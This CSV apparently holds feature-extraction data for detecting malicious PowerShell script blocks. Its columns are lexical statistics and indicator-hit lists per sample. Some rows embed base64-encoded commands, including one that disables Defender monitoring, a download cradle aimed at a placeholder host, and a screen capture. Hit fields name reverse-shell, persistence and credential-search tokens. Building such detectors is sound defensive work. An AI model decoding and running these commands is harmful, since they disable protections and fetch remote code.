id,lexical_input_source,analysis_length,line_count,token_count,special_char_count,special_char_ratio,digit_ratio,whitespace_ratio,entropy,quoted_literal_count,short_literal_count,joined_literal_length,base64_candidate_count,longest_base64_candidate,decoded_view_count,backtick_count,concat_operator_count,join_operator_count,format_operator_count,char_cast_count,suspicious_mixed_case_count,suspicious_mixed_case_tokens,execution_hit_count,execution_hits,raw_execution_hit_count,recovered_execution_hit_count,decoded_execution_hit_count,download_hit_count,download_hits,raw_download_hit_count,recovered_download_hit_count,decoded_download_hit_count,network_c2_hit_count,network_c2_hits,raw_network_c2_hit_count,recovered_network_c2_hit_count,decoded_network_c2_hit_count,defense_evasion_hit_count,defense_evasion_hits,raw_defense_evasion_hit_count,recovered_defense_evasion_hit_count,decoded_defense_evasion_hit_count,persistence_hit_count,persistence_hits,raw_persistence_hit_count,recovered_persistence_hit_count,decoded_persistence_hit_count,credential_access_hit_count,credential_access_hits,raw_credential_access_hit_count,recovered_credential_access_hit_count,decoded_credential_access_hit_count,lolbin_hit_count,lolbin_hits,raw_lolbin_hit_count,recovered_lolbin_hit_count,decoded_lolbin_hit_count,collection_hit_count,collection_hits,raw_collection_hit_count,recovered_collection_hit_count,decoded_collection_hit_count,remote_execution_hit_count,remote_execution_hits,raw_remote_execution_hit_count,recovered_remote_execution_hit_count,decoded_remote_execution_hit_count,discovery_hit_count,discovery_hits,raw_discovery_hit_count,recovered_discovery_hit_count,decoded_discovery_hit_count,indicator_category_count,high_risk_category_count,raw_indicator_hit_count,indicator_hit_count,recovered_indicator_hit_count,decoded_indicator_hit_count
PST-001,windows_event_4104_scriptblocktext,284,1,31,94,0.330986,0.06338,0.03169,5.112692,12,8,175,0,0,0,0,0,1,0,0,1,Sockets.TcpC,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,2,2,0
PST-002,windows_event_4104_scriptblocktext,125,1,9,20,0.16,0.0,0.032,4.934428,1,0,57,1,26,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-003,windows_event_4104_scriptblocktext,260,1,34,94,0.361538,0.05,0.023077,5.01455,12,12,147,0,0,0,0,0,1,0,0,1,Invoke-WebR,0,,0,0,0,1,invoke-webrequest,0,1,0,1,jitter,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,2,2,0
PST-004,windows_event_4104_scriptblocktext,225,1,25,76,0.337778,0.0,0.04,4.93609,13,13,111,0,0,0,0,0,1,0,0,1,Get-ChildIte,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,0,2,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,0,3,3,0
PST-005,windows_event_4104_scriptblocktext,131,1,19,48,0.366412,0.0,0.061069,4.847498,9,8,43,0,0,0,3,0,1,0,0,1,gEt-PrOc,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0
PST-006,windows_event_4104_scriptblocktext,49,1,6,5,0.102041,0.020408,0.122449,4.126226,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-007,windows_event_4104_scriptblocktext,97,1,11,10,0.103093,0.020619,0.113402,4.631482,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-008,windows_event_4104_scriptblocktext,157,1,14,28,0.178344,0.012739,0.063694,5.132935,2,2,22,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-009,windows_event_4104_scriptblocktext,109,1,14,23,0.211009,0.018349,0.06422,4.734244,1,0,71,0,0,0,2,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,regsvr32,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-010,windows_event_4104_scriptblocktext,198,1,20,54,0.272727,0.0,0.131313,4.715514,10,10,111,0,0,0,0,9,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,collect.zip;compress-archive,1,1,0,0,,0,0,0,1,get-childitem,0,1,0,2,0,1,3,2,0
PST-011,windows_event_4104_scriptblocktext,162,1,16,39,0.240741,0.0,0.067901,4.752823,1,0,116,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,password;select-string,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,2,1,3,3,0,0
PST-012,windows_event_4104_scriptblocktext,74,1,7,5,0.067568,0.013514,0.094595,4.450349,0,0,0,0,0,0,0,0,0,0,0,1,Get-LocalGroup,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-013,windows_event_4104_scriptblocktext,58,1,8,8,0.137931,0.017241,0.103448,4.38512,1,1,16,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-014,windows_event_4104_scriptblocktext,326,1,10,26,0.079755,0.03681,0.009202,5.087623,1,0,204,1,204,1,0,0,0,0,0,2,FromBase64String;WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,0,1,1,0,,0,0,0,0,,0,0,0,2,1,1,2,1,1
PST-015,windows_event_4104_scriptblocktext,280,1,32,48,0.171429,0.014286,0.042857,5.129698,1,0,236,0,0,1,18,0,0,0,0,1,AdABlAC0ATwB1AH,1,encodedcommand,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-016,windows_event_4104_scriptblocktext,85,1,10,10,0.117647,0.011765,0.129412,4.400264,1,1,7,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-017,windows_event_4104_scriptblocktext,90,1,9,11,0.122222,0.0,0.077778,4.753857,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-018,windows_event_4104_scriptblocktext,354,1,10,27,0.076271,0.033898,0.008475,5.045999,1,0,232,1,232,1,0,0,0,0,0,2,FromBase64String;UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA,0,,0,0,0,0,,0,0,0,0,,0,0,0,4,disableRealtimeMonitoring;exclusionpath;frombase64string;set-mppreference,1,3,3,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,4,3,3
PST-019,windows_event_4104_scriptblocktext,140,1,7,20,0.142857,0.05,0.021429,5.121303,1,0,64,1,64,1,0,0,0,0,0,2,FromBase64String;VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-020,windows_event_4104_scriptblocktext,191,1,25,84,0.439791,0.0,0.052356,4.831684,13,12,85,0,0,0,4,0,1,0,0,0,,1,get-command,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-021,windows_event_4104_scriptblocktext,78,1,7,23,0.294872,0.0,0.128205,4.591644,4,4,37,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-022,windows_event_4104_scriptblocktext,85,1,9,14,0.164706,0.0,0.070588,4.639256,1,0,47,0,0,0,2,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-023,windows_event_4104_scriptblocktext,215,1,19,48,0.223256,0.083721,0.037209,5.14773,1,0,175,0,0,0,0,0,0,0,0,1,System.Net.Sockets.TcpClient,0,,0,0,0,0,,0,0,0,2,getstream;tcpclient,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,2,2,0,0
PST-024,windows_event_4104_scriptblocktext,223,1,11,21,0.09417,0.017937,0.049327,5.165345,1,0,183,1,72,1,0,0,0,0,0,0,,2,encodedcommand;scriptblock,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,2,0,0,0,,0,0,0,2,2,4,4,0,0
PST-025,windows_event_4104_scriptblocktext,215,1,29,81,0.376744,0.0,0.04186,5.023609,14,13,108,0,0,0,4,0,1,0,0,2,ESTInAtIOn;eXaMpLe.,0,,0,0,0,1,start-bitstransfer,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,1,1,0
PST-026,windows_event_4104_scriptblocktext,145,1,17,35,0.241379,0.0,0.041379,4.898866,1,0,103,0,0,0,6,0,0,0,0,0,,0,,0,0,0,1,invoke-webrequest,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-027,windows_event_4104_scriptblocktext,177,1,16,42,0.237288,0.00565,0.045198,5.150515,1,0,135,0,0,0,0,0,0,0,0,1,MsXml2.ServerXmlHttp,1,iex,1,0,0,2,responseText;serverxmlhttp,2,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,3,3,0,0
PST-028,windows_event_4104_scriptblocktext,287,1,32,94,0.327526,0.0,0.041812,5.106061,12,7,180,0,0,0,0,0,1,1,0,0,,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,certutil,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-029,windows_event_4104_scriptblocktext,140,1,14,13,0.092857,0.014286,0.092857,4.717295,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-030,windows_event_4104_scriptblocktext,87,1,10,19,0.218391,0.022989,0.045977,4.840378,1,0,53,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-031,windows_event_4104_scriptblocktext,94,1,11,11,0.117021,0.010638,0.106383,4.715151,1,1,16,0,0,0,0,0,0,0,0,1,AccessToString,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-032,windows_event_4104_scriptblocktext,223,1,22,28,0.125561,0.008969,0.080717,5.232695,1,0,183,0,0,0,0,0,0,0,0,5,MEMBeRDeFInitiOn;PRoCEssiD;ThESis.inErT;naTivEMeTHoDs;openPRoCEsS,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-033,windows_event_4104_scriptblocktext,47,2,6,6,0.12766,0.021277,0.148936,4.378329,0,0,0,0,0,0,1,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-034,windows_event_4104_scriptblocktext,482,1,10,27,0.056017,0.024896,0.006224,4.797927,1,0,360,1,360,1,0,0,0,0,0,1,FromBase64String,2,encodedcommand;windowstyle hidden,0,2,2,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,3,2,2
PST-035,windows_event_4104_scriptblocktext,114,1,12,25,0.219298,0.035088,0.017544,5.30821,1,0,76,0,0,0,0,0,0,0,0,2,cOPyfrOMSCreEN;sYStem.DRaWinG.GRAphics,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-036,windows_event_4104_scriptblocktext,114,1,13,21,0.184211,0.008772,0.070175,4.831164,2,1,51,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-037,windows_event_4104_scriptblocktext,36,1,4,10,0.277778,0.0,0.055556,4.00675,3,3,14,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-038,windows_event_4104_scriptblocktext,190,1,21,67,0.352632,0.021053,0.015789,5.12716,11,11,84,0,0,1,0,0,1,0,0,1,VEhFU0lTL,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,0,3,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,0,3,3,0
PST-039,windows_event_4104_scriptblocktext,292,1,26,67,0.229452,0.013699,0.041096,5.247575,12,8,183,0,0,1,0,0,1,0,0,2,ABlAC0ATwB1AH;VwByAGkAd,2,encodedcommand;scriptblock,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,computername;invoke-command,2,0,0,0,,0,0,0,2,2,2,4,2,0
PST-040,windows_event_4104_scriptblocktext,78,1,8,12,0.153846,0.0,0.064103,4.628038,1,0,40,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,1,0,0,1,0,1,1,0,0
PST-041,windows_event_4104_scriptblocktext,110,1,8,15,0.136364,0.0,0.045455,4.750958,1,0,72,0,0,0,0,0,0,0,0,2,Get-PSReadLineOption;HistorySavePath,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-042,windows_event_4104_scriptblocktext,21,1,2,2,0.095238,0.0,0.047619,3.975418,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-043,windows_event_4104_scriptblocktext,292,1,35,74,0.253425,0.006849,0.065068,4.897296,12,9,183,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,add-type,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-044,windows_event_4104_scriptblocktext,124,1,10,24,0.193548,0.008065,0.048387,5.126387,1,1,6,0,0,0,0,0,0,0,0,1,Get-FileHash,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-045,windows_event_4104_scriptblocktext,331,1,28,76,0.229607,0.012085,0.039275,5.167015,12,2,218,0,0,1,0,0,1,0,0,4,AEUAUgBUACcA;AdABlAC0ATwB1AHQAcA;New-ScheduledTaskAc;VwByAGk,1,encodedcommand,0,1,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,new-scheduledtaskaction;register-scheduledtask,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,0,3,3,0
PST-046,windows_event_4104_scriptblocktext,242,1,10,25,0.103306,0.028926,0.012397,5.158981,1,0,120,1,120,1,0,0,0,0,0,2,FromBase64String;RwBlAHQALQBDAGwAaQBwAGIAbwBhAHIAZAAgAC0AUgBhAHcAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBDAG8AbQBwAHIAZQBzAHMA,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-clipboard,0,1,1,0,,0,0,0,0,,0,0,0,2,1,1,2,1,1
PST-047,windows_event_4104_scriptblocktext,124,1,7,21,0.169355,0.0,0.032258,4.802535,1,0,84,0,0,0,0,0,0,0,0,1,Get-ItemProperty,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,1,0,0,1,0,1,1,0,0
PST-048,windows_event_4104_scriptblocktext,160,1,17,45,0.28125,0.0,0.15625,4.464693,11,11,72,0,0,0,0,10,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-049,windows_event_4104_scriptblocktext,168,1,17,42,0.25,0.011905,0.047619,5.254407,1,0,122,0,0,0,0,0,0,0,0,2,aPI.eXAmplE.INvaLID;inVokE-ReSTMetHod,0,,0,0,0,1,invoke-restmethod,1,0,0,1,checkin,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,2,2,0,0
PST-050,windows_event_4104_scriptblocktext,62,1,7,12,0.193548,0.0,0.048387,4.776462,0,0,0,0,0,0,0,0,0,0,0,1,ConvertTo-Json,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,computername,1,0,0,0,,0,0,0,1,1,1,1,0,0
PST-051,windows_event_4104_scriptblocktext,114,1,12,19,0.166667,0.0,0.04386,4.803555,1,0,76,0,0,0,4,0,0,0,0,1,Get-PSReadLineOption,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-052,windows_event_4104_scriptblocktext,191,1,26,71,0.371728,0.0,0.036649,5.093887,12,11,92,0,0,0,8,0,1,0,0,1,ENtvERsI,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-itemproperty,0,1,0,1,0,0,1,1,0
PST-053,windows_event_4104_scriptblocktext,170,1,24,60,0.352941,0.0,0.058824,4.876493,11,10,74,0,0,0,4,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,1,0,0,1,1,0
PST-054,windows_event_4104_scriptblocktext,123,1,13,15,0.121951,0.00813,0.089431,4.820234,1,1,16,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-055,windows_event_4104_scriptblocktext,124,1,8,24,0.193548,0.032258,0.016129,5.378597,1,0,84,1,24,0,0,0,0,0,0,3,ReFLection.asSemBLy;fRombaSE64STRiNG;vehfu0LtLUlOrVJUluRVtU1z,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,assembly]::load;frombase64string;reflection.assembly,3,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,3,3,0,0
PST-056,windows_event_4104_scriptblocktext,78,1,8,6,0.076923,0.012821,0.102564,4.482464,0,0,0,0,0,0,0,0,0,0,0,1,Get-SmbShare,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-057,windows_event_4104_scriptblocktext,134,1,11,19,0.141791,0.0,0.074627,5.116614,1,0,94,0,0,0,0,0,0,0,0,5,ReSOlvE-dnsnAme;StrInGS;exPANDprOpeRtY;sELeCT-obJECT;task.eXAmplE.InvaLiD,0,,0,0,0,0,,0,0,0,1,resolve-dnsname,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,1,1,1,0,0
PST-058,windows_event_4104_scriptblocktext,135,1,17,46,0.340741,0.0,0.044444,4.765755,8,8,40,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-process,0,1,0,1,0,0,1,1,0
PST-059,windows_event_4104_scriptblocktext,25,1,4,4,0.16,0.0,0.08,3.783465,0,0,0,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-060,windows_event_4104_scriptblocktext,55,1,7,6,0.109091,0.018182,0.127273,4.537316,0,0,0,0,0,0,0,0,0,0,0,1,Get-ChildItem,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,1,0,0,1,0,1,1,0,0
PST-061,windows_event_4104_scriptblocktext,570,1,10,27,0.047368,0.040351,0.005263,4.899109,1,0,448,1,448,1,0,0,0,0,0,2,FromBase64String;JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACAAJAB3AGMALgBQAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACAAJAB3AGMALgBIAGUAYQBkAGUAcgBzAFsAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcAXQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACcAOwAgACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALgBlAHgAYQBtAHAAbABlAC4AaQBuAHYAYQBsAGkAZAAvAGEAJwApAA,0,,0,0,0,2,downloadstring;webclient,0,2,2,2,defaultwebproxy;user-agent,0,2,2,1,frombase64string,1,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,3,3,1,5,4,4
PST-062,windows_event_4104_scriptblocktext,170,1,20,54,0.317647,0.0,0.047059,4.744165,9,9,70,0,0,0,0,0,1,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,get-childitem,0,1,0,1,0,0,1,1,0
PST-063,windows_event_4104_scriptblocktext,116,1,14,27,0.232759,0.034483,0.017241,5.063902,1,0,78,0,0,0,2,0,0,0,0,1,CopyFromScreen,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,1,copyfromscreen,1,0,0,0,,0,0,0,0,,0,0,0,1,0,1,1,0,0
PST-064,windows_event_4104_scriptblocktext,283,1,30,101,0.35689,0.007067,0.024735,5.079155,13,12,167,0,0,0,0,0,1,0,0,1,ultWebProxy,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-065,windows_event_4104_scriptblocktext,133,1,13,15,0.112782,0.037594,0.067669,5.009729,1,1,8,0,0,0,0,0,0,0,0,1,Get-WinEvent,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-066,windows_event_4104_scriptblocktext,279,1,33,103,0.369176,0.007168,0.032258,5.359985,13,8,173,0,0,0,6,0,1,0,0,2,NeT.weBCliENT;c.heAdErs,0,,0,0,0,2,downloadstring;webclient,1,1,0,2,defaultwebproxy;user-agent,0,2,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,2,2,1,4,3,0
PST-067,windows_event_4104_scriptblocktext,116,1,12,27,0.232759,0.008621,0.12931,4.647635,5,4,58,0,0,0,0,3,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
PST-068,windows_event_4104_scriptblocktext,142,1,21,26,0.183099,0.056338,0.06338,4.889052,2,0,97,0,0,0,0,0,0,0,0,0,,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,,0,0,0,0,0,0,0,0,0
